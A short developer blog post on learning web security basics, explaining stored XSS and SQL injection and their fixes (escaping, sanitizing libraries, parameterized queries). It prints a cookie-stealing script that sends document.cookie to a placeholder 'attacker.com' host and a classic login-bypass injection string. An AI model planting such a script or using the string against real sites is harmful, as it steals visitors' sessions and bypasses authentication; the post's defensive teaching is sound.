My Journey into the Basics of Web Security

January 2026 4 min read

As a web developer, it is easy to get lost in making things look good and forget about making them safe. My interest in cybersecurity started when I learned just how easy it is to break a website that trusts user input blindly.

Never Trust the User

The golden rule I learned is: Never trust input from the client. I used to think, "Why would a user type a script tag into a search bar?" The answer is: because they can, and malicious actors will.

Understanding XSS (Cross-Site Scripting)

I was shocked to learn about Stored XSS. If I build a comment section and just render the text raw, someone could post:

<script> fetch('http://attacker.com/steal?cookie=' + document.cookie); </script>

If my website renders this, every visitor who sees that comment basically hands over their session cookies to the attacker. The fix? Always escape HTML entities or use libraries that sanitize input automatically (like React does by default, or libraries like DOMPurify).

SQL Injection: The Classic

I also delved into SQL Injection (SQLi). It's terrifying how a simple login form can be bypassed with `' OR '1'='1`. This taught me to always use parameterized queries or an ORM/ODM (like Mongoose for MongoDB) rather than concatenating strings to build database queries.

Conclusion

Learning these basics didn't just make me paranoid; it made me a better developer. Security isn't an afterthought or a "feature" you add at the end—it has to be baked into how you think about data flow from day one.
